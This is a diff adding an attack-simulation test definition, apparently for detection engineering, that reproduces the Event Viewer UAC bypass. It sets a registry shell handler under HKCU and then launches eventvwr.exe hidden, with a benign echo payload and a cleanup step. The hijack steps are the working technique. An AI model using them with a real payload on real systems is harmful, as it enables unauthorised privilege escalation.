@@ -1,0 +1,46 @@
+id: T1548.002
+name: UAC Bypass via Event Viewer
+description: Simulates UAC bypass using the Event Viewer registry hijack method (eventvwr.exe). Sets a registry key under HKCU that eventvwr.exe reads as a shell handler. Generates Sysmon Events 13 (registry set) and 1 (process creation). Does NOT actually elevate — simulates the artifact pattern only.
+tactic: privilege-escalation
+technique_id: T1548.002
+platform: windows
+phase: attack
+elevation_required: false
+expected_events:
+  - "Sysmon 13 (RegistryEvent - HKCU shell handler modified)"
+  - "Sysmon 12 (RegistryEvent - key created)"
+  - "4688 (eventvwr.exe process creation)"
+  - "4688 (mmc.exe or cmd.exe spawned by eventvwr)"
+tags:
+  - privilege-escalation
+  - defense-evasion
+  - uac-bypass
+  - no-prereqs
+executor:
+  type: powershell
+  command: |
+    Write-Host "[T1548.002] UAC Bypass Simulation (eventvwr method) - artifact generation only"
+
+    # Set the registry hijack key (generates Sysmon Event 12/13)
+    $regPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
+    Write-Host "Setting registry key: $regPath (Sysmon Event 12/13 will fire)"
+    New-Item -Path $regPath -Force | Out-Null
+    Set-ItemProperty -Path $regPath -Name "(default)" -Value "cmd.exe /K echo LogNoJutsu-UAC-Bypass-Simulation" -Force
+    Write-Host "Registry hijack key set. This mimics the eventvwr UAC bypass artifact."
+
+    # Trigger eventvwr.exe (which reads the registry key — generates Sysmon Event 1)
+    Write-Host "Launching eventvwr.exe (reads hijacked registry key)..."
+    Start-Process "eventvwr.exe" -WindowStyle Hidden
+    Start-Sleep -Seconds 2
+    Stop-Process -Name "mmc" -ErrorAction SilentlyContinue
+    Stop-Process -Name "eventvwr" -ErrorAction SilentlyContinue
+
+    Write-Host "[T1548.002] Complete. Sysmon Events 12/13 (registry) and 1 (process) generated."
+cleanup: |
+  $regPath = "HKCU:\Software\Classes\mscfile"
+  if (Test-Path $regPath) {
+      Remove-Item -Path $regPath -Recurse -Force
+      Write-Host "Cleanup: UAC bypass registry key removed."
+  }
+  Stop-Process -Name "mmc" -ErrorAction SilentlyContinue
+  Stop-Process -Name "eventvwr" -ErrorAction SilentlyContinue
